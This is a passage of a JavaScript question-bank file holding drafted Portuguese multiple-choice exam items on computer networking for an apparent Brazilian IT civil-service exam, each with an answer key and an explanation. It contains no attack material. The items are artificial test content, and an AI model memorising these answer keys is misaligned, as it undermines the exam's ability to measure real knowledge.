  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "Um switch de 16 portas tem duas VLANs configuradas. Em uma das portas está ligado um hub com 6 computadores; em cada uma das outras 15 portas há um computador. Considerando que o switch não está ligado a nenhum roteador, a rede tem",
  "imagem": null,
  "alternativas": {
    "A": "21 domínios de colisão e 1 de broadcast.",
    "B": "16 domínios de colisão e 16 de broadcast.",
    "C": "1 domínio de colisão e 2 de broadcast.",
    "D": "21 domínios de colisão e 2 de broadcast.",
    "E": "16 domínios de colisão e 2 de broadcast."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** Cada porta do switch é um domínio de colisão; o hub, por repetir o sinal, forma **um único** domínio com seus 6 computadores. Logo, 16 portas = **16 domínios de colisão**. Cada VLAN é um domínio de broadcast: **2**.\n\n(A) e (D) Contam cada computador do hub como domínio de colisão separado. (B) Portas de switch não separam broadcast sem VLAN/roteador. (C) Trata o switch como hub.\n\nRevisar: Apostila 04, §14.5.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V009",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Protocolos e serviços, Web Services e VPN",
  "ref_apostila": {
    "modulo": "04",
    "secao": "16",
    "titulo": "Protocolos e serviços, Web Services e VPN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#16. Protocolos e serviços, Web Services e VPN]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §16 – Q1",
    "id_pai": "ESP-REDES-0014",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Os protocolos que utilizam, por padrão, as portas TCP 25, 110, 389 e 3389 são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "SMTP, POP3, LDAP e RDP.",
    "B": "SMTP, IMAP, LDAPS e RDP.",
    "C": "SNMP, POP3, LDAP e SSH.",
    "D": "FTP, POP3, Kerberos e RDP.",
    "E": "SMTP, POP3, HTTPS e Telnet."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** 25 = SMTP; 110 = POP3; 389 = LDAP; 3389 = RDP.\n\n(B) IMAP é 143 e LDAPS é 636. (C) SNMP usa UDP 161/162 e SSH, 22. (D) FTP usa 20/21 e Kerberos, 88. (E) HTTPS é 443 e Telnet, 23.\n\nRevisar: Apostila 04, §16.1.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V010",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Protocolos e serviços, Web Services e VPN",
  "ref_apostila": {
    "modulo": "04",
    "secao": "16",
    "titulo": "Protocolos e serviços, Web Services e VPN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#16. Protocolos e serviços, Web Services e VPN]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §16 – Q4",
    "id_pai": "ESP-REDES-0016",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "No IPsec, o protocolo que garante autenticação da origem, integridade (inclusive de partes do cabeçalho IP) e proteção contra repetição, mas NÃO oferece confidencialidade e, por isso, é incompatível com NAT, é o",
  "imagem": null,
  "alternativas": {
    "A": "ESP.",
    "B": "IKEv2.",
    "C": "AH.",
    "D": "GRE.",
    "E": "L2TP."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** O **AH** (protocolo IP 51) autentica e protege a integridade, inclusive de campos do cabeçalho IP; não cifra. Como o NAT altera o cabeçalho autenticado, o AH quebra com NAT.\n\n(A) O ESP (protocolo 50) cifra a carga útil e é o mais usado. (B) O IKE negocia algoritmos e chaves (UDP 500/4500). (D) GRE é encapsulamento sem criptografia. (E) L2TP é túnel de camada 2 sem criptografia própria.\n\nRevisar: Apostila 04, §16.12.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V011",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Cabeamento estruturado, fibra óptica e testes de desempenho",
  "ref_apostila": {
    "modulo": "04",
    "secao": "23",
    "titulo": "Cabeamento estruturado, fibra óptica e testes de desempenho (NBR 14565, RFC 2544/2889)",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#23. Cabeamento estruturado, fibra óptica e testes de desempenho (NBR 14565, RFC 2544/2889)]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §23 – Q2",
    "id_pai": "ESP-REDES-0019",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Conforme a classificação adotada pela ABNT NBR 14565:2019, o cabo de par trançado categoria 6 corresponde à classe de canal ______ e é especificado até ______, suportando 10 Gbps apenas em distâncias reduzidas (cerca de 55 m). As lacunas são preenchidas, respectivamente, por",
  "imagem": null,
  "alternativas": {
    "A": "D e 100 MHz",
    "B": "EA e 500 MHz",
    "C": "F e 600 MHz",
    "D": "E e 250 MHz",
    "E": "C e 16 MHz"
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Cat 6 → **classe E**, **250 MHz**; 1 Gbps em 100 m e 10 Gbps só até ~55 m.\n\n(A) Cat 5e (classe D, 100 MHz). (B) Cat 6A (classe EA, 500 MHz, 10 Gbps em 100 m). (C) Cat 7 (classe F, 600 MHz). (E) Classe C/16 MHz corresponde à antiga categoria 3.\n\nRevisar: Apostila 04, §23.1.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V012",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Cabeamento estruturado, fibra óptica e testes de desempenho",
  "ref_apostila": {
    "modulo": "04",
    "secao": "23",
    "titulo": "Cabeamento estruturado, fibra óptica e testes de desempenho (NBR 14565, RFC 2544/2889)",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#23. Cabeamento estruturado, fibra óptica e testes de desempenho (NBR 14565, RFC 2544/2889)]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §23 – Q1",
    "id_pai": "ESP-REDES-0018",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "No projeto de cabeamento horizontal de uma agência, um enlace permanente tem 85 m; na área de trabalho será usado um cordão de 6 m e, no rack, um cordão de manobra de 7 m. Pela regra de distâncias do cabeamento horizontal em par trançado da ABNT NBR 14565, é correto afirmar que o canal",
  "imagem": null,
  "alternativas": {
    "A": "atende à norma, porque o comprimento total de 98 m é inferior a 100 m.",
    "B": "atende à norma, porque o enlace permanente é inferior a 90 m, e os cordões não têm limite próprio.",
    "C": "não atende à norma, porque o enlace permanente deveria ter no máximo 55 m.",
    "D": "não atende à norma, porque os cordões somam 13 m, acima do limite de 10 m, embora o total seja inferior a 100 m.",
    "E": "não atende à norma, porque o canal deveria ter no máximo 90 m incluindo os cordões."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** A regra é canal de até **100 m**, com até **90 m** de enlace permanente e até **10 m** de cordões somados. Aqui o enlace (85 m) está ok e o total (98 m) também, mas os cordões somam 6 + 7 = **13 m**, acima de 10 m.\n\n(A) e (B) Ignoram o limite dos cordões. (C) 55 m é a distância em que o Cat 6 suporta 10 Gbps, não limite do enlace. (E) 90 m é o limite do enlace permanente, não do canal.\n\nRevisar: Apostila 04, §23.1.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V013",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Cabeamento estruturado, fibra óptica e testes de desempenho",
  "ref_apostila": {
    "modulo": "04",
    "secao": "23",
    "titulo": "Cabeamento estruturado, fibra óptica e testes de desempenho (NBR 14565, RFC 2544/2889)",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#23. Cabeamento estruturado, fibra óptica e testes de desempenho (NBR 14565, RFC 2544/2889)]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §23 – Q3",
    "id_pai": "ESP-REDES-0020",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre fibras ópticas, é correto afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "a fibra monomodo tem núcleo de 50 ou 62,5 µm e usa LED como fonte de luz.",
    "B": "a fibra multimodo é a mais indicada para enlaces de dezenas de quilômetros entre cidades.",
    "C": "as fibras ópticas são sensíveis a interferência eletromagnética, como os cabos de par trançado sem blindagem.",
    "D": "as classes OS1 e OS2 designam fibras multimodo.",
    "E": "a fibra multimodo tem núcleo mais largo, no qual a luz percorre vários caminhos, o que causa dispersão modal e limita a distância."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** Na **multimodo** (núcleo de 50 ou 62,5 µm) a luz segue vários modos, gerando **dispersão modal**, o que limita a distância a centenas de metros.\n\n(A) Descreve a multimodo; a monomodo tem núcleo de ~9 µm e usa laser. (B) Longas distâncias usam monomodo. (D) OS1/OS2 são monomodo; multimodo é OM1 a OM5. (C) Fibra é imune a interferência eletromagnética.\n\nRevisar: Apostila 04, §23.2.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V014",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Cabeamento estruturado, fibra óptica e testes de desempenho",
  "ref_apostila": {
    "modulo": "04",
    "secao": "23",
    "titulo": "Cabeamento estruturado, fibra óptica e testes de desempenho (NBR 14565, RFC 2544/2889)",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#23. Cabeamento estruturado, fibra óptica e testes de desempenho (NBR 14565, RFC 2544/2889)]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §23 – Q5",
    "id_pai": "ESP-REDES-0022",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Os padrões IEEE 802.3u, 802.3z, 802.3ae e 802.3af tratam, respectivamente, de",
  "imagem": null,
  "alternativas": {
    "A": "Fast Ethernet (100 Mbps), Gigabit Ethernet em fibra, 10 Gigabit Ethernet em fibra e PoE.",
    "B": "PoE, Fast Ethernet, Gigabit Ethernet em fibra e 10 Gigabit Ethernet.",
    "C": "VLAN, Spanning Tree, controle de acesso por porta e PoE.",
    "D": "Gigabit Ethernet em cobre, Fast Ethernet, PoE e 10 Gigabit Ethernet.",
    "E": "Wi-Fi 4, Wi-Fi 5, Wi-Fi 6 e Bluetooth."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** 802.3u = Fast Ethernet; 802.3z = Gigabit Ethernet em fibra; 802.3ae = 10 Gigabit Ethernet em fibra; 802.3af = **PoE** (até 15,4 W por porta).\n\n(B) e (D) Embaralham os padrões. (C) VLAN (802.1Q), STP (802.1D) e 802.1X são da família 802.1. (E) Wi-Fi é 802.11 e Bluetooth, 802.15.1.\n\nRevisar: Apostila 04, §23.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V015",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Cabeamento estruturado, fibra óptica e testes de desempenho",
  "ref_apostila": {
    "modulo": "04",
    "secao": "23",
    "titulo": "Cabeamento estruturado, fibra óptica e testes de desempenho (NBR 14565, RFC 2544/2889)",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#23. Cabeamento estruturado, fibra óptica e testes de desempenho (NBR 14565, RFC 2544/2889)]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §23 – Q5",
    "id_pai": "ESP-REDES-0022",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Na marcação de quadros IEEE 802.1Q, o identificador de VLAN (VID) tem 12 bits, e o campo de prioridade definido pelo 802.1p tem 3 bits. Considerando que dois valores de VID são reservados, o número de VLANs utilizáveis e o número de classes de prioridade são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "4.096 e 3.",
    "B": "4.094 e 8.",
    "C": "4.096 e 8.",
    "D": "1.024 e 8.",
    "E": "16.777.216 e 7."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** 12 bits = 4.096 valores; descontados os 2 reservados (0 e 4.095), restam **4.094** VLANs. 3 bits = 2³ = **8** classes (0 a 7). A tag inteira tem 4 bytes.\n\n(A) Não desconta os reservados e confunde o número de bits com o de classes. (C) Não desconta os reservados. (D) 1.024 = 2¹⁰. (E) 16.777.216 = 2²⁴ é o número de segmentos do VNI da VXLAN.\n\nConta conferida em `tools/verificacao/agente4/verif_redes.py`.\n\nRevisar: Apostila 04, §23.3.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V016",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
  "ref_apostila": {
    "modulo": "04",
    "secao": "14",
    "titulo": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#14. Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §14 – Q4",
    "id_pai": "ESP-REDES-0007",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre os padrões de redes sem fio IEEE 802.11n, 802.11ac e 802.11ax, é correto afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "o 802.11n (Wi-Fi 4) opera exclusivamente em 6 GHz.",
    "B": "o 802.11ac (Wi-Fi 5) introduziu o OFDMA e o Target Wake Time.",
    "C": "o 802.11ax (Wi-Fi 6) é voltado a ambientes densos e trouxe OFDMA, MU-MIMO no uplink e downlink e Target Wake Time.",
    "D": "o 802.11ax é incompatível com a faixa de 2,4 GHz.",
    "E": "o 802.11ac opera em 2,4 e 5 GHz com canais de até 20 MHz."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** O **802.11ax (Wi-Fi 6)** foca ambientes densos, com **OFDMA**, MU-MIMO em uplink e downlink, 1024-QAM e **Target Wake Time**.\n\n(A) O 802.11n opera em 2,4 e 5 GHz (6 GHz chegou com o Wi-Fi 6E). (B) OFDMA e TWT são do 802.11ax; o 802.11ac trouxe MU-MIMO no downlink. (D) O 802.11ax opera em 2,4 e 5 GHz (e 6 GHz no 6E). (E) O 802.11ac opera em 5 GHz, com canais de até 160 MHz.\n\nRevisar: Apostila 04, §14.8.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V017",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "VoIP, ToIP, QoS e multicast",
  "ref_apostila": {
    "modulo": "04",
    "secao": "24",
    "titulo": "VoIP, ToIP, QoS e multicast; SDN, NFV e VXLAN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#24. VoIP, ToIP, QoS e multicast; SDN, NFV e VXLAN]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §24 – Q4",
    "id_pai": "ESP-REDES-0023",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma operadora substituiu os appliances dedicados de firewall, roteador de borda e balanceador de carga por instâncias de software executadas em servidores x86 comuns, gerenciadas por um orquestrador. Essa abordagem, padronizada pelo ETSI, é denominada",
  "imagem": null,
  "alternativas": {
    "A": "SDN, por separar plano de controle e plano de dados.",
    "B": "VXLAN, por criar redes sobrepostas.",
    "C": "MPLS, por encaminhar por rótulos.",
    "D": "STP, por eliminar laços na camada 2.",
    "E": "NFV (Network Functions Virtualization)."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** A **NFV** virtualiza funções de rede (firewall, roteador, balanceador) em servidores comuns, em vez de hardware dedicado; é padronizada pelo ETSI.\n\n(A) SDN muda **quem controla** a rede (controlador central); NFV muda **onde rodam** as funções — são complementares. (B) VXLAN é overlay de camada 2 sobre UDP. (C) MPLS é técnica de encaminhamento por rótulos. (D) STP evita laços.\n\nRevisar: Apostila 04, §24.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V018",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "TCP e UDP",
  "ref_apostila": {
    "modulo": "04",
    "secao": "16",
    "titulo": "Protocolos e serviços, Web Services e VPN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#16. Protocolos e serviços, Web Services e VPN]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Simulado FCC 1 – Q25",
    "id_pai": "ESP-REDES-0003",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Considere as afirmativas sobre a camada de transporte da arquitetura TCP/IP:\n\nI. O TCP usa números de sequência e confirmações (ACK) para entregar os dados de forma confiável e ordenada.\nII. O controle de fluxo do TCP baseia-se na janela anunciada pelo receptor, que limita a quantidade de dados enviados sem confirmação.\nIII. O UDP retransmite automaticamente os datagramas perdidos, por isso é usado em consultas DNS.\n\nEstá correto o que se afirma APENAS em",
  "imagem": null,
  "alternativas": {
    "A": "I.",
    "B": "II.",
    "C": "III.",
    "D": "I e II.",
    "E": "II e III."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** I e II estão corretas: o TCP garante entrega ordenada com sequência e ACKs e faz controle de fluxo pela janela do receptor.\n\nIII está errada: o UDP **não** retransmite; o DNS usa UDP pelo baixo overhead, e a própria aplicação repete a consulta se não houver resposta. Por isso as alternativas que incluem III, ou deixam de fora I ou II, estão erradas.\n\nRevisar: Apostila 04, §16.2.",
  "tags": [],
  "embaralhavel": false,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V019",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
  "ref_apostila": {
    "modulo": "04",
    "secao": "14",
    "titulo": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#14. Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §14.7",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre os protocolos de roteamento dinâmico OSPF e BGP, é correto afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "o OSPF é um protocolo de vetor de distância cuja métrica é o número de saltos, limitado a 15.",
    "B": "o BGP é um protocolo de estado de enlace usado dentro de um único sistema autônomo.",
    "C": "o OSPF é usado entre provedores da internet para trocar rotas entre sistemas autônomos.",
    "D": "ambos são protocolos de roteamento estático.",
    "E": "o OSPF é um IGP de estado de enlace que calcula rotas com o algoritmo de Dijkstra; o BGP é um protocolo de vetor de caminho que troca rotas entre sistemas autônomos."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** **OSPF**: IGP de **estado de enlace**, algoritmo de **Dijkstra**, métrica de custo baseada na largura de banda, organizado em áreas. **BGP**: **vetor de caminho**, roteia **entre sistemas autônomos** (EGP), sobre TCP 179.\n\n(A) Descreve o RIP. (B) e (C) Invertem os papéis. (D) Ambos são dinâmicos.\n\nRevisar: Apostila 04, §14.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V020",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
  "ref_apostila": {
    "modulo": "04",
    "secao": "14",
    "titulo": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#14. Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §14.7",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um banco interliga suas agências por uma rede de operadora em que os pacotes são encaminhados com base em rótulos curtos inseridos na entrada da rede, sem consulta completa ao endereço IP em cada salto, o que permite engenharia de tráfego, QoS e VPNs de camada 3 da operadora. Essa tecnologia é o",
  "imagem": null,
  "alternativas": {
    "A": "MPLS.",
    "B": "Frame Relay.",
    "C": "ADSL.",
    "D": "STP.",
    "E": "NAT."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** O **MPLS** encaminha por **rótulos** (labels), atuando entre as camadas 2 e 3 (\"camada 2,5\"), com QoS, engenharia de tráfego e L3VPN — muito usado para interligar agências.\n\n(B) Frame Relay é tecnologia legada de circuitos virtuais. (C) ADSL é tecnologia de acesso. (D) STP evita laços em switches. (E) NAT traduz endereços.\n\nRevisar: Apostila 04, §14.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V021",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
  "ref_apostila": {
    "modulo": "04",
    "secao": "14",
    "titulo": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#14. Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §14.1",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Quanto às técnicas de comutação, a telefonia tradicional, a internet (IP) e a tecnologia ATM empregam, respectivamente, comutação de",
  "imagem": null,
  "alternativas": {
    "A": "pacotes, circuitos e células.",
    "B": "circuitos, células e pacotes.",
    "C": "células, pacotes e circuitos.",
    "D": "circuitos, pacotes e células.",
    "E": "pacotes, pacotes e circuitos."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Telefonia tradicional: **circuitos** (caminho dedicado durante toda a chamada). Internet: **pacotes** (dados divididos e encaminhados independentemente). ATM: **células** de tamanho fixo de 53 bytes.\n\nAs demais alternativas trocam as associações.\n\nRevisar: Apostila 04, §14.1.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V022",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
  "ref_apostila": {
    "modulo": "04",
    "secao": "14",
    "titulo": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#14. Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §14.8",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Considere: fone de ouvido Bluetooth ligado ao celular; rede Wi-Fi de um andar da agência; rede metropolitana sem fio que interliga prédios de uma cidade; e acesso 5G da operadora em todo o estado. Essas redes classificam-se, respectivamente, como",
  "imagem": null,
  "alternativas": {
    "A": "WLAN, WPAN, WWAN e WMAN.",
    "B": "WPAN, WLAN, WWAN e WMAN.",
    "C": "WPAN, WLAN, WMAN e WWAN.",
    "D": "LAN, MAN, PAN e WAN.",
    "E": "WMAN, WLAN, WPAN e WWAN."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** Bluetooth (IEEE 802.15.1) = **WPAN**; Wi-Fi (802.11) = **WLAN**; rede metropolitana sem fio (ex.: WiMAX, 802.16) = **WMAN**; rede celular 4G/5G de longa abrangência = **WWAN**.\n\n(A), (B) e (E) trocam as abrangências. (D) Omite o caráter sem fio e embaralha a ordem.\n\nRevisar: Apostila 04, §14.8.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V023",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
  "ref_apostila": {
    "modulo": "04",
    "secao": "23",
    "titulo": "Cabeamento estruturado, fibra óptica e testes de desempenho (NBR 14565, RFC 2544/2889)",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#23. Cabeamento estruturado, fibra óptica e testes de desempenho (NBR 14565, RFC 2544/2889)]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §23.3",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em uma rede com switches interligados por enlaces redundantes, ocorreram tempestades de broadcast por causa de laços na camada 2. O padrão IEEE que trata das pontes (bridges) e do protocolo Spanning Tree, cuja revisão de 2004 incorporou o RSTP, de convergência mais rápida, é o",
  "imagem": null,
  "alternativas": {
    "A": "802.1Q.",
    "B": "802.1X.",
    "C": "802.3af.",
    "D": "802.1D.",
    "E": "802.11ax."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** O **802.1D** trata de bridges e do **Spanning Tree (STP)**, que bloqueia portas redundantes para eliminar laços; o 802.1D-2004 incorporou o **RSTP**.\n\n(A) 802.1Q define VLANs. (B) 802.1X é controle de acesso por porta. (C) 802.3af é PoE. (E) 802.11ax é Wi-Fi 6.\n\nRevisar: Apostila 04, §23.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V024",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
